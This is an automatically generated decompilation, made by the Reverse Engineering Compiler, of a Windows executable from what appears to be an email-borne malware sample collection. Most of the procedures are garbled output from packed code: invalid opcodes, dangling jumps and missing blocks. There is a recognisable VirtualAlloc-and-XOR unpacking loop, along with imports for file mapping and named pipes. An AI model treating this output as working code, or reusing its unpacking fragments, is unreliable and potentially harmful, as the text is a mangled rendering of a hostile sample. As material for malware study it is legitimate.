/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0049/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 00401332 -> 00401318 */
/* DEST BLOCK NOT FOUND: 0040133f -> 00401308 */
/* DEST BLOCK NOT FOUND: 00401353 -> 004012ff */
stack space not deallocated on return
/*	Procedure: 0x00401324 - 0x00401356
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401324()
{



    cl = 139;
    asm("aam 0x89");
    (save)edx;
    al = al + 137;
    edx = edx + 1;
    asm("sbb [eax-0x34],ch");
L0040132d:
    esp = *ecx;
L00401330:
    (restore)ecx;
    goto L00401318;
    ebx = ebx + 1;
    esp = esp - 20;
    asm("in al,dx");
    eax = 0;
    goto L00401330;
    if(ecx = ecx - eax) {
        goto L00401308;
    }
    esp = esp + 24;
    asm("sti");
    asm("sgdt [edx+0x18]");
    esi = esi + eax;
    goto L0040132d;
    L004002af(eax);
    goto L004012ff;
    (restore)ebx;
}

/* DEST BLOCK NOT FOUND: 0040135d -> 004013a4 */
/* DEST BLOCK NOT FOUND: 00401365 -> 004013a4 */
/*	Procedure: 0x00401357 - 0x0040136E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401357()
{



    *L10401078 = *L10401078 + 1;
    asm("jpe 0x4013a4");
    eax = 2574;
    asm("clc");
    goto L0000bde8;
    (save)ss;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 0040140d -> 5846133c */
stack space not deallocated on return
/*	Procedure: 0x0040136F - 0x004014B1
 *	Argument size: -161
 *	Local size: 0
 *	Save regs size: 0
 */

L0040136F(A8, A18)
/* unknown */ void  A8;
/* unknown */ void  A18;
{



    eax = 5140;
    asm("sti");
    asm("sbb edx,[edi+0x47ce8]");
L00401376:
    if(!( *(eax - 119) = *(eax - 119) + al)) {
        asm("xchg ebp,eax");
        ecx = 1476399107;
    }
    L004018E1();
    dh = dh + 6;
    ebp = ebp - 1;
    asm("rcl dword [eax-0x18],cl");
    esp = 1593835543;
    esi = esi - 1;
    goto L00401376;
    *L10401018 = *L10401018 + 1;
    asm("les edx,[ecx+edx*2]");
L004013a4:
    *edi = eax;
    edi = edi + 4;
    (restore)esp;
    esi = esi & *eax;
    cl = 185;
    (save)185;
    ebp = ebp + 1;
    *L53D312A4 :: esp;
    goto L004013a4;
    edx = edx + 1;
    if(1048576 & eax) {
        goto L004013a4;
    }
    goto L004013f3;
    (save)1081343;
    (save)-1654734845;
L004013cd:
    (restore)ecx;
    (restore)ebx;
    (restore)edx;
    asm("Unknown opcode 0xd3");
    ecx = ecx ^ ebx;
    eax = cx;
    (restore)ecx;
    ebx = 0;
    eax = eax + ecx >> 16;
    (restore)ecx;
    edx = edx & ecx;
    goto L004013cd;
    eax = -1590680762;
    asm("adc eax,edx");
    eax = eax - 1;
    (restore)edx;
    asm("sti");
    return;
    eax = eax + 272633860;
L004013f3:
    asm("%s mov esp,0x611e8");
    *(ecx - 61) = *(ecx - 61) + dh;
    asm("pusha");
    eax = *(ebx + 8);
    ecx = *(edx + 64);
    eax = *ebx;
    edx = 80;
    asm("sti");
    goto L5846133c;
    asm("adc [eax+0x10],al");
    (restore)eax;
    asm("stc");
    asm("Unknown opcode 0xd1");
    asm("lock jnc 0x401456");
    edx = 0;
    goto L00401456;
    edx = 0;
    asm("loop 0x401464");
    goto L00401429;
    cl = 23;
L00401427:
    goto L00401427;
L00401429:
    ebx = 0;
    ecx = *esi;
    L00005352();
    edx = -1056065792;
    goto L00401429;
    asm("xchg eax,ebp");
    tword [ecx+0x1008] = (frestore);
    if(!(esi = esi + 1)) {
        if(ebx = ebx - 1) {
            goto L00401464;
        }
        asm("sti");
        (save)cs;
        return;
        (restore)esi;
    }
    eax = L0000e2f8();
L00401456:
    edi = -202679733;
    L000074c0();
    asm("rol ecx,0xe0");
L00401464:
    >= ? L00401421 : ;
    asm("sti");
    ch = 77;
    *L10401068 = *L10401068 + 1;
    asm("out dx,eax");
    asm("xlatb");
    *L10401024 = *L10401024 + 1;
    asm("int3");
    eax = eax - ebx;
L0040147c:
    A18 = __imp__VirtualAlloc;
    (save)64;
    (save)12288;
    goto L004014bf;
    A8 = eax;
    ecx = edi;
    ebx = 4096;
    edi = eax;
    goto L004014a8;
    *esp = *esp + ebp;
    edx = 4194304;
    goto L0040147c;
L004014a8:
    ecx = (ecx >> 2) + 1;
    asm("lodsd");
    eax = eax ^ ebx;
    *edi = eax;
    edi = edi + 4;
    goto L004014c8;
}

/* DEST BLOCK NOT FOUND: 004014bd -> 0040147c */
/* DEST BLOCK NOT FOUND: 004014c6 -> 0040148f */
/* DEST BLOCK NOT FOUND: 004014dd -> 0040149e */
/* DEST BLOCK NOT FOUND: 004014ee -> 004014f1 */
/*	Procedure: 0x004014B2 - 0x004014EF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004014B2()
{



    asm("pusha");
    edi = 2236;
    esi = 0x4012af;
    goto L0040147c;
    ebp = ecx;
    (save)edi;
    (save)0;
    *ecx();
    goto L0040148f;
    asm("loop 0x4014ac");
    ecx = __imp__VirtualFree;
    asm("popa");
    ebp = ebp + 928;
    (save)753;
    goto L0040149e;
    *__imp__HeapDestroy();
    asm("outsb");
    (restore)edx;
    (save)edx;
    edx :: 0;
    edx = ecx / ecx % ecx / ecx;
    asm("xchg eax,ebp");
    asm("Unknown opcode 0xd2");
    == ? L004014f1 : ;
}

/*	Procedure: 0x004014F0 - 0x004014F6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004014F0()
{



    (save)eax;
    asm("imul ecx");
    (restore)edx;
    asm("rol esp,cl");
    (save)271844863;
}

/* DEST BLOCK NOT FOUND: 0040152e -> 00401536 */
/*	Procedure: 0x004014F7 - 0x00401536
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004014F7()
{



    *L10401034 = *L10401034 + 1;
    (fsave)(frestore) / *esi;
    return;
    (save)ecx;
L00401501:
    eax = L00501b47();
    asm("adc ecx,ecx");
    asm("clc");
    al :: *esi;
    if(*eax = *eax + dl) {
        goto L00401501;
    }
L0040150f:
    goto L0040150f;
    asm("lahf");
    asm("Unknown opcode 0x82");
    *L10401038 = *L10401038 + 1;
    asm("das");
    eax = (eax ^ 271058431) + 1;
    asm("adc [eax],ah");
    (save)esi;
    (save)eax;
    asm("out dx,eax");
    asm("adc ebx,[ebx-0x3d]");
    asm("out dx,eax");
    asm("adc eax,0x501048");
    goto L00401536;
    ebx = *(ebx + 1 + 12);
    asm("sti");
    asm("in eax,dx");
L00401536:
}

/* DEST BLOCK NOT FOUND: 004015a1 -> 5b4000a8 */
stack space not deallocated on return
/*	Procedure: 0x00401537 - 0x004018E0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401537()
{



    *L10401064 = *L10401064 + 1;
    esp = *L00000024;
    (save)eax;
    (save)16;
    edx = edx + 1;
    ecx = *(ebx + 8);
    asm("sti");
    al = al ^ 59;
L0040154a:
    asm("retf 0xf165");
    goto L00401593;
L00401550:
    esi = esi + 1;
    (save)edi;
    (save)ecx;
    edx = *(ecx + 8);
    goto L00401572;
L00401558:
    edi = edi - 1;
    (restore)esi;
    eax = *ecx;
    L00501767();
    (save)ecx;
    goto L0040157c;
L00401565:
    edi = *(ecx + 12);
    asm("adc edi,[ebx]");
    goto L00401550;
    asm("wait");
    asm("enter 0xc985,0xfb");
    ch = ch - al;
L00401572:
    al = *esi;
    esi = esi + 1;
    asm("adc [eax],eax");
    *(ebx + 48873944) = *(ebx + 48873944) + cl;
L0040157c:
    asm("sti");
    (save)cs;
    eax = esi;
    edx :: 0;
    ecx = *(ecx + 44) / *(ecx + 44);
    edx = ecx % ecx;
    eax = cx;
    goto L004015a6;
    eax :: 0;
    asm("rep stosd");
    ecx = ecx - 1;
    goto L00401558;
L00401593:
    return;
    asm("jecxz 0x40153b");
    (restore)ecx;
    asm("adc ecx,+0x28");
    goto L0040154a;
    asm("%g add ch,bl");
    cl = !cl;
    goto L5b4000a8;
L004015a6:
    esi = eax;
    ecx = ecx - 1;
    (restore)eax;
    esi = esi + *(ebx + 20);
    goto L00401565;
    bl = bl ^ dl;
    ebx = 0;
    if(!( *L10401010 = *L10401010 + 1)) {
        ebx = 0 ^ ecx;
        eax = L00301500();
        goto L004015fc;
        eax = eax + 1;
        *edi = *esi;
        edi = edi + 1;
        esi = esi + 1;
        bl = 2;
        asm("clc");
        asm("jpe 0x4015d0");
        *eax = *eax + dl;
        goto L004015f6;
L004015cf:
        eax = L00401B37();
        asm("arpl [ecx+0x33],cx");
        bl = bl >> 12;
L004015da:
        if(eax <= 111) {
            (save)ecx + 1;
        }
        *esp = eax;
        asm("sti");
        L00402B47();
        if(!(eax = eax + 1)) {
            ecx = ecx + 1;
        }
L004015ef:
        al = *LFB02B310;
        asm("%d jnc 0x4015c5");
L004015f6:
        ecx :: 0;
        goto L004015cf;
L004015fc:
        asm("sti");
        *(ecx + edx * 8 + -349211400) = *(ecx + edx * 8 + -349211400) - ch;
        eax = eax ^ 268690408;
    }
L00401608:
    if(*L00006D00 = *L00006D00 + bh) {
        goto L004015ef;
    }
    asm("arpl dx,cx");
    goto L004015da;
    asm("arpl [edx],bx");
    if(ah == 5) {
        edx = -857167381;
        asm("Unknown opcode 0xfe");
        asm("Unknown opcode 0xff");
        asm("Unknown opcode 0xff");
        asm("sti");
        asm("xchg eax,ecx");
        (restore)eax;
        (save)eax;
        asm("sti");
        asm("adc edx,[ebx]");
        (restore)ebp;
        asm("sti");
        cl = 235;
        asm("aad 0xfb");
        asm("xchg eax,esi");
        (restore)ecx;
        return;
        asm("clc");
        (save)cs;
        eax = eax + -1072558080;
        goto L00401608;
        bl = 1;
    }
    L00401B1D();
    asm("sti");
    goto L00004010;
    asm("adc [esp+edi*2],bl");
L0040164d:
    *L10401020 = *L10401020 + 1;
    edx = cs;
    asm("adc esi,+0x28");
    if(!(edx = edx - 1)) {
        return;
        eax = *(eax + 20) & 65535;
        esi = edx + edx + 24;
        eax = *(eax + 6) & 65535;
        esi = esi - 56;
        edx = edx + 1;
        goto L0040167c;
        asm("wait");
        ecx = ecx | *(ebx + 1099635835);
        al :: 19;
        ebx = ebx >> 226;
L0040167c:
        asm("wait");
        eax = eax + 1;
        (save)eax;
        (save)edx;
        *edi = al;
        edi = edi + 1;
        al = al + *eax;
        *eax = *eax + dl;
        goto L0040168d;
        (save)edx;
        asm("clc");
        (restore)ss;
        *eax = *eax + eax;
        asm("adc [ecx+0x136ae8],dl");
L0040168d:
        *(edx - 5) = *(edx - 5) + bl;
        asm("Unknown opcode 0xc1");
        al = 255;
    }
    eax = eax + 272633980;
    asm("xchg eax,esi");
    *(ebx + 65454562) = *(ebx + 65454562) & cl;
L0040169f:
    edx = edx << 1;
    *(ebx + 1670056011) = *(ebx + 1670056011) - ebx;
    al = eax + -349043571 + 81;
    asm("cmpxchg486 [ecx+0x14],eax");
    ebp = *ebx;
    ecx = *(ecx + 84);
    if(eax = ecx + eax + 8) {
        goto L0040164d;
    }
    ebx = ebx >> 15;
L004016c5:
    asm("popa");
    asm("rep movsb");
    edx = *(ecx + 22);
    asm("xchg eax,ecx");
    goto L0040169f;
L004016d0:
    asm("clc");
    asm("bound eax,[eax+eax]");
    asm("adc [ebx],al");
    eax = eax >> 1;
    while(ecx = ecx - 1) {
    }
    asm("Unknown opcode 0xff");
    *(eax + 268512232) = *(eax + 268512232) + 1;
    bl = bl + ch;
    asm("adc al,bh");
    al :: *eax;
    ecx = eax;
    edx = edx ^ eax;
    ecx = ecx >> 2;
    asm("jecxz 0x40169d");
    goto L004016c5;
    asm("clc");
    if(!( *eax = *eax + dl)) {
    }
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    eax = *(ebx + 20);
    eax = L0050173f();
    goto L004016d0;
    asm("int3");
    eax :: 393105;
    asm("adc [eax+0x10],al");
    asm("%d idiv edi");
    eax = eax + 272633968;
    asm("in al,dx");
    asm("adc bh,bh");
    eax + 272633948 :: 9;
L0040171f:
    (restore)ecx;
    ebx = ebx >> cl;
    (save)es;
    (save)ecx;
    asm("wait");
    bl = ebx - 1 | ch;
    asm("adc ebx,eax");
    ecx = *(ecx + 40);
    L003014e7();
    goto L0040171f;
    (save)ss;
    asm("o16 scasb");
    *L1040104C = *L1040104C + 1;
    goto L00000000;
    asm("jpe 0x401746");
    return(*( *(ebx + 28) + 24)(eax));
    *__imp__ReadFile();
    asm("rol dword [edx+0x8005ff27],cl");
    asm("adc [eax+0x10],al");
    al = al + 254;
    eax = L004014F7();
    ecx = ecx - 1;
    goto L00401770;
    (save)ecx;
    asm("wait");
    ebx = ebx - 1;
    *(ebx + -269796263) = *(ebx + -269796263) | cl;
L00401770:
    asm("ror dword [ebp+0x7f],cl");
    *L10401040 = *L10401040 + 1;
    ebp = 1227266;
    *eax = *eax + al;
    eax & 268435488;
    eax & 537919488;
    asm("cmovnz eax,ecx");
    ecx = 1048580;
    goto L004017ba;
L00401794:
    asm("wait");
    esi = esi - 1;
    al = al | 139;
    (save)esi;
    *ebx = *ebx | al;
    edx = edx | *(ebp + 1447301056);
    asm("adc bl,ch");
    *(ebx + 270869574) = *(ebx + 270869574) & bl;
    al = *L000040AA;
    asm("adc [0xa0100000],bh");
    if(*eax = *eax + al) {
        goto L00401794;
    }
    asm("sti");
    *(ecx + -2147479552) = *(ecx + -2147479552) >> 15;
L004017ba:
    (save)ebp;
    ebx = ebx >> 1;
    al = al >> 1;
    (restore)edx;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    return;
    edi :: 0;
    eax = eax + 272633884;
    asm("Unknown opcode 0xfe");
    goto L0000711c;
L004017d9:
    asm("xchg esi,edi");
    return;
L004017dc:
    ebx :: 0;
    eax = L004005c4();
    goto L004017d9;
    if(!(ebp = ebp - *esp)) {
        asm("cld");
        dl = 144;
        goto L004017dc;
        == ? L00401850 : ;
        esi = esi + *ebx;
        edx = *ebx;
        goto L00401834;
L004017fb:
        (save)esi;
        ebp = *(esi + 16) + *ebx;
        asm("xchg eax,esi");
        edx = *ebx;
        asm("sti");
        *(ebx + -387251002) = *(ebx + -387251002) - al;
        goto L00401834;
        esi = *ebx;
        esp = esp + *(esi + 60);
        goto L0040181c;
        asm("xchg eax,ebx");
        asm("aas");
        *(ebp - 7) = *(ebp - 7) + dh;
        (restore)esi;
        goto L00401834;
L0040181c:
        asm("wait");
        es = *(eax + eax + -1232404464);
        *eax = *eax + al;
        bl = bl + dh;
        (save)ss;
        esi :: 0;
        asm("sti");
        asm("ror dword [ebx+0xebc69b0f],0xd");
L00401834:
        al = al | *%fs:ebx];
        esi = esi + 1;
        asm("sbb al,0xe8");
        asm("repne cld");
        asm("out dx,eax");
        asm("Unknown opcode 0xff");
        goto L004017fb;
        asm("ror dword [ebp+0xf7121154],cl");
    }
    asm("rol dword [eax],0x10");
    *(eax + -389393393) = *(eax + -389393393) + al;
    eax & -1426063342;
    asm("sti");
    esi = -376323076;
    *eax = *eax + al;
    asm("adc [eax],eax");
    goto L004018a4;
L00401860:
    asm("wait");
    *(eax + -411773855) = *(eax + -411773855) >> 1;
    goto L004018bd;
L00401869:
    *(ebx + 4) = eax;
    al & 114;
    asm("Unknown opcode 0x8d");
    asm("xlatb");
    (save)es;
    goto L00401886;
    *(ebx + 12) = edx;
    eax = 710561138;
    eax = L004019A6();
    asm("cdq");
    ebx = ebx + 1;
    asm("adc [ebx-0x5],bl");
    eax = eax >> 1;
L00401886:
    *eax = *eax + al;
    *(ebx + 8) = edx - *ecx;
    eax = -131530126;
    L004019A6();
    asm("sti");
    asm("fst dword [ebx-0x75]");
    ebx = ebx - 1;
    al = al | 129;
    asm("loope 0x4018b1");
    bh = bh + bh;
    (save) *(esi - 127);
L004018a4:
    if(*(ebp + 74) == ecx) {
        goto L00401860;
    }
    goto L00401869;
    eax = L005019b6();
    *ebx = eax;
    *ebx & 116;
    eax = *ebx | -118988764;
    *eax = *eax + dl;
L004018bd:
    bl = bl + ch;
    eax & -1950521734;
    asm("out dx,al");
    ebx = -1591729316;
    ecx = 2012895461;
    goto L00401901;
    asm("pusha");
    edx = eax;
    asm("sti");
    asm("in eax,dx");
    eax = *edi & ebx;
    edx = edx - 17;
    goto L004018e9;
    return;
    (restore)edx;
}

/* DEST BLOCK NOT FOUND: 00401940 -> 004018cd */
/* DEST BLOCK NOT FOUND: 0040199f -> 004019c5 */
/* DEST BLOCK NOT FOUND: 004019bd -> 00401a37 */
/*	Procedure: 0x004018E1 - 0x004019A5
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004018E1(A20)
/* unknown */ void  A20;
{



    ecx = ecx - eax;
    A20 = A20 - ebx;
L004018e6:
    goto L004018e6;
    *edi = eax;
    edi = edi + 4;
    asm("%g call 0xc23f0453");
    goto L00001420;
L004018f9:
    eax = 2146304000;
    ecx = *L7FEE0330;
    asm("adc ecx,[eax]");
    eax = *edi;
    (restore)ds;
    esi = 869479369;
    asm("Unknown opcode 0xc1");
    al = al ^ 93;
    if(edx != 0) {
        goto L004018f9;
    }
    *edi = eax;
    edi = edi + 4;
    al & 45;
    *eax = *eax + al;
    asm("adc bl,ch");
    asm("lds ecx,[ecx+0x438d1053]");
L0040191b:
    al = al + 137;
    ebx = ebx + 1;
    al = al | 153;
    asm("adc ebp,ebx");
L00401928:
    asm("rcl dword [eax+0xffef67e8],cl");
    asm("Unknown opcode 0xff");
    L0040136F();
    asm("adc esi,[esi+0x3c]");
    *(ebx + 8) = esp;
    goto L0040194c;
    if(eax = eax + 1630323859) {
        goto L004018cd;
    }
    asm("les eax,[ebx+0xdc8b2cfc]");
    asm("jpe 0x40194a");
    goto L0040191b;
L0040194c:
    asm("clc");
    asm("lodsd");
    asm("cli");
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    L003016ac();
    goto L00401928;
    <= ? L00401942 : ;
    asm("adc eax,0x3cebbd92");
L0040195f:
    (restore)edi;
    edi = edi - 1;
    goto L004019c1;
    (restore)edi;
    if(edi <= eax) {
        asm("adc edi,ecx");
        goto L00401988;
        asm("wait");
        > ? L0040198f : ;
        esp = esp + ebx;
        goto L0040195f;
        ebp = ebp + ebx;
        (save)edi;
        (save) *(edx + 108);
        esi = eax;
        goto L004019b9;
        (save)ecx;
        ecx = 0;
        asm("clc");
        asm("scasd");
        asm("cli");
        asm("Unknown opcode 0xff");
        asm("out dx,eax");
        (restore)ecx;
        goto L00401992;
L00401988:
        dh = dh + *(bp + di);
        asm("rcr byte [ecx+0x711c2444],0xc3");
    }
L00401992:
    (restore)esi;
    if(edx == edx) {
        goto L004019c4;
    }
    asm("loop 0x40196c");
    goto L0040195f;
    (save)esi;
    asm("popf");
    al = al ^ 3;
    goto L004019c5;
    esi = esi + ebx;
    asm("lodsd");
    asm("adc eax,ebx");
}

/* DEST BLOCK NOT FOUND: 004019a7 -> 00401953 */
/* DEST BLOCK NOT FOUND: 004019bf -> 00401963 */
/* DEST BLOCK NOT FOUND: 004019c2 -> 0040198c */
/* DEST BLOCK NOT FOUND: 00401a0d -> 00ba6b65 */
/*	Procedure: 0x004019A6 - 0x00401A76
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004019A6()
{



    (restore)ecx;
    goto L00401953;
    ecx = eax;
    esi = esi - 1;
    ecx = ecx >> 1;
    asm("adc bl,ah");
    al = al | 139;
L004019b1:
    edi = edi - 1;
    asm("sbb bl,bh");
    ecx = 96;
    edx = edx + *(edx + 60);
    asm("wait");
    asm("jpe 0x401a37");
    goto L00401963;
    asm("xchg eax,ecx");
    goto L0040198c;
    esi :: ebx;
    esi = esi - *(edi + 48) >> 1;
    goto L004019ec;
    esi = esi << 2;
    asm("adc esi,[edi+0x1c]");
    goto L004019b1;
    *(esi + 2) :: dl;
    asm("%g mov eax,0x7713a1eb");
    asm("cmpsd");
    if(!(al = al & 15)) {
        asm("Unknown opcode 0xfe");
        asm("sti");
        asm("out 0x64,eax");
L004019e7:
        L004014F0();
L004019ec:
        asm("rcl dword [ecx+0x8f0c148],cl");
        al = *esi;
        esi = esi + 1;
        ebx = ebx ^ ecx;
        goto L004019e7;
        (save)ecx;
        eax = eax + 1;
        goto L00401a02;
L004019fb:
        (restore)ebx;
        asm("rcl dword [ebx+0x50],cl");
L004019ff:
        (save)esp;
        asm("sti");
        (save)es;
L00401a02:
        *(ebx + 28)();
        (restore)eax;
        goto L004019fb;
        asm("wait");
        (restore)ebx;
        al = al | 82;
        asm("sti");
        goto L00ba6b65;
        edx = *(ebx + 28);
        (save)eax;
    }
    goto L00401a1d;
    asm("jpe 0x401a1a");
    (save)esp;
    goto L004019ff;
L00401a1d:
    *edx();
    (restore)eax;
    asm("rcr dword [ebp+0x234cbb39],cl");
    *(ecx + 535550227) = *(ecx + 535550227) ^ ah;
    asm("wait");
    edx = edx | *(ebx - 4);
    asm("sti");
    asm("int1");
L00401a32:
    ecx = 4172;
    esp = esp + ebx;
    asm("jecxz 0x401a60");
    goto L00401a4b;
L00401a3d:
    esi = esi + ebx;
    eax = L00401324();
    asm("scasb");
    asm("psubb mm1,mm7");
    esi = esi - 1;
    goto L00401a32;
L00401a4b:
    ecx = 563;
    asm("wait");
    asm("clc");
    esi = 1590689068;
    asm("jecxz 0x401a54");
    goto L00401a3d;
    eax = L00401324();
    eax & 268438366;
    esi = 1589641380;
    asm("jecxz 0x401a73");
    asm("adc esi,ebx");
    L00400334();
    (restore)ebx;
    *edi = *edi << cl;
    *(ebx + -326412801) :: ecx;
}

/*	Procedure: 0x00401A77 - 0x00401AC6
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)0;
    (save)16384;
    (save)0;
    (save)4;
    (save)0;
    (save)-1;
    eax = *__imp__CreateFileMappingA();
    if(eax != 0) {
        (save)eax;
        *__imp__GetCurrentProcessId();
        (restore)eax;
        (save)0;
        (save)0;
        (save)0;
        (save)6;
        (save)eax;
        eax = *__imp__MapViewOfFile();
        if(eax != 0) {
            return(L00401AC7(eax));
            (restore)eax;
            L004014B2();
            eax = 0;
        }
    }
}

/*	Procedure: 0x00401AC7 - 0x00401B1C
 *	Argument size: -24
 *	Local size: 28
 *	Save regs size: 0
 */

L00401AC7(A8, A28)
/* unknown */ void  A8;
/* unknown */ void  A28;
{



    *__imp__VirtualQuery(A8, esp, 28);
    eax = A28 >> 12;
    ecx = eax - 1;
    *(esp + eax) = *(esp + eax) + eax;
    return;
    (save)50;
L00401af3:
    (save)ecx;
    asm("wait");
    (save)ebx;
    al = al | 80;
    asm("out dx,eax");
    (save)edx;
    al = al + 195;
    (restore)ds;
    bh = 209;
    asm("rsm");
    asm("loope 0x401b22");
    asm("pmagw mm1,mm2");
    goto L00401af3;
    *(ebx - 77) = *(ebx - 77) + 1;
    (restore)esi;
    asm("rcl dword [esi-0x75],cl");
    *ebx = *ebx / *ebx;
    edx = *ebx % *ebx;
    asm("rep lock movsb");
    asm("sti");
    asm("cmc");
    asm("wait");
    *(esp + *(ebx + 16) + 32) = eax;
}

/*	Procedure: 0x00401B1D - 0x00401B36
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B1D()
{



    *(ecx - 21) = *(ecx - 21) & ah;
    *(ecx + 1048608) = *(ecx + 1048608) + edi;
    (save)0;
    asm("repne cld");
    esp = esp + 144;
    asm("sti");
    asm("adc [ebx+0xeaeb48e8],ecx");
}

/*	Procedure: 0x00401B37 - 0x00401B6A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B37()
{



    edx = *ebx;
    eax = eax + *(eax + 60);
    asm("wait");
    eax = eax + 1;
    *ebx = *ebx - al;
    asm("adc ebp,ebx");
    asm("aam 0xff");
    asm("lock cmp edx,eax");
    if(!(al = al + dl)) {
        al = *esi;
        esi = esi + 1;
        asm("adc dl,dl");
    }
    *ecx = *ecx << cl;
    *eax = *eax ^ dl;
    *(eax - 117) = *(eax - 117) + dl;
    (restore)ebx;
    al = L00a86bc1() | 106;
    bh = bh + ch;
    (save)ecx;
    asm("adc bl,al");
    asm("out dx,eax");
    asm("adc eax,0x501030");
}

/* DEST BLOCK NOT FOUND: 00401b7c -> 00401bc1 */
/* DEST BLOCK NOT FOUND: 00401b7e -> 00401bc1 */
/*	Procedure: 0x00401B6B - 0x00401BB6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B6B()
{



    *(edx - 62) = *(edx - 62) + ah;
    eax = eax + 1234080304;
    ch = ch | *edx;
    asm("clc");
    *edi = eax;
    edi = edi + 4;
    *eax = *eax + eax;
    asm("Unknown opcode 0xd2");
    if(*eax = *eax + cl) {
        goto L00401bc1;
    }
    goto ( *ebx);
    ecx = ecx & 1920751708;
    *ebx = *ebx + dh;
    ah = ah + al;
    al = *LD7A6DB23;
    asm("sbb cx,sp");
    asm("loope 0x401b6d");
    *eax = *eax + al;
    *eax = *eax + al;
    *ebx = *ebx | al;
    esp = ebp;
    (restore)ebp;
    esp :: 0;
    esp = esp - 1;
    (save)eax;
    dh = dh & *eax;
    eax = *L0C000000;
    ebx = ebx ^ *(ecx + 125);
    asm("lodsd");
    (restore)edi;
    eax :: 1426312302;
    *edi = eax;
    edi = edi + 4;
    *(edx + 74) :: cl;
}

/*	Procedure: 0x00402B47 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402B47()
{



}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x00401004       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x00401008       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__HeapDestroy;
/* 0x00401010       0 */ /* unknown */ void 	__imp__GetFileAttributesExA;
/* 0x00401014       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00401018       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__EnterCriticalSection;
/* 0x00401020       0 */ /* unknown */ void 	__imp__GetFileTime;
/* 0x00401024       0 */ /* unknown */ void 	__imp__ConnectNamedPipe;
/* 0x00401028       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x0040102c       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00401030       0 */ /* unknown */ void 	__imp__UnmapViewOfFile;
/* 0x00401034       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x00401038       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x0040103c       0 */ /* unknown */ void 	__imp__VirtualQuery;
/* 0x00401040       0 */ /* unknown */ void 	__imp__InitializeCriticalSection;
/* 0x00401044       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x00401048       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x0040104c       0 */ /* unknown */ void 	__imp__TryEnterCriticalSection;
/* 0x00401050       0 */ /* unknown */ void 	__imp__WaitNamedPipeA;
/* 0x00401054       0 */ /* unknown */ void 	__imp__MapViewOfFile;
/* 0x00401058       0 */ /* unknown */ void 	__imp__PeekNamedPipe;
/* 0x0040105c       0 */ /* unknown */ void 	__imp__SetFilePointerEx;
/* 0x00401060       0 */ /* unknown */ void 	__imp__FileTimeToDosDateTime;
/* 0x00401064       0 */ /* unknown */ void 	__imp__SetCurrentDirectoryA;
/* 0x00401068       0 */ /* unknown */ void 	__imp__CreateNamedPipeA;
/* 0x0040106c       0 */ /* unknown */ void 	__imp__GetCurrentProcessId;
/* 0x00401070       0 */ /* unknown */ void 	__imp__GetCurrentDirectoryA;
/* 0x00401074       0 */ /* unknown */ void 	__imp__CreateFileMappingA;
/* 0x00401078       0 */ /* unknown */ void 	__imp__SetFilePointer;
/* 0x0040107c       0 */ /* unknown */ void 	__imp__HeapCompact;
/* 0x00401080       0 */ /* unknown */ void 	__imp__LeaveCriticalSection;
/* 0x00401a77       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
